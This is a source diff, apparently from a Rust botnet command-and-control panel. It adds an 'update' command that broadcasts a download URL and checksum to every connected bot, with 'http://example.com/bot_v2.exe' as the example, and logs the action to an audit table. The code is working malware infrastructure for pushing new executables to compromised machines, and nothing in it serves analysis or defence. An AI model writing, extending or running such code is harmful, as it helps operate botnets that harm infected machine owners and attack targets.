@@ -1,9 +1,7 @@
 use std::sync::Arc;
-use tokio::io::AsyncWriteExt;
-use tokio::process::Command;
 use crate::modules::client_manager::Client;
 use crate::modules::state::AppState;
-use crate::modules::error::{Result, AuditLog, log_audit_event};
+use crate::modules::error::{Result, AuditLog, log_audit_event, CncError};
 use crate::modules::auth::Level;
 use super::ui::*;
 use super::general::show_prompt;
@@ -524,5 +522,26 @@ pub async fn handle_bot_queue_command(client: &Arc<Client>, state: &Arc<AppState
             client.write(format!("\x1b[38;5;196m[X] Failed to queue command: {}\n\r", e).as_bytes()).await?;
         }
     }
+    Ok(())
+}
+pub async fn handle_update_command(client: &Arc<Client>, state: &Arc<AppState>, parts: &[&str]) -> Result<()> {
+    if parts.len() < 2 {
+        client.write(b"\x1b[38;5;196m[X] Usage: update <url> [checksum]\n\r").await?;
+        client.write(b"\x1b[38;5;245mExample: update http://example.com/bot_v2.exe\n\r").await?;
+        return Ok(());
+    }
+    let url = parts[1];
+    let checksum = parts.get(2).map(|s| s.to_string());
+    
+    client.write(format!("\x1b[38;5;226m[!] Broadcasting update command to all bots...\n\rURL: {}\n\r", url).as_bytes()).await?;
+    
+    state.bot_manager.broadcast_update(url.to_string(), checksum.clone()).await;
+    
+    client.write(b"\x1b[38;5;82m[✓] Update broadcast complete.\n\r").await?;
+    
+    let audit_event = AuditLog::new(client.user.username.clone(), "BROADCAST_UPDATE".to_string(), "SUCCESS".to_string())
+        .with_target(url.to_string());
+    let _ = log_audit_event(audit_event, &state.pool).await;
+    
     Ok(())
 }
